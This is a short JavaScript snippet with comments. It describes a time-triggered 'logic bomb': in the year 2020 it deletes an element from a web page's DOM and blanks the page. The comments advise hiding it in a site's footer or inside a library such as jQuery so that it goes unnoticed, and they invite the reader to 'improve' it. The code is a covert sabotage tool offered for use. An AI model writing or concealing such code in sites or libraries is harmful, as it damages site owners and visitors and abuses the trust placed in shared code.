let date = new Date();
let year = date.getFullYear();

if (year == 2020) { //launch func in this year
	let elem = document.querySelector('#background-cover'); //get body id, class or tag
	elem.parentNode.removeChild(elem); //remove it from dom.
};

//put it in the footer. best way to hide it is to put it in some js library, like jQuery for example,
//in 2020 year this script remove everything from body making blank page.
//this is just simple idea, what can be improved like you want.
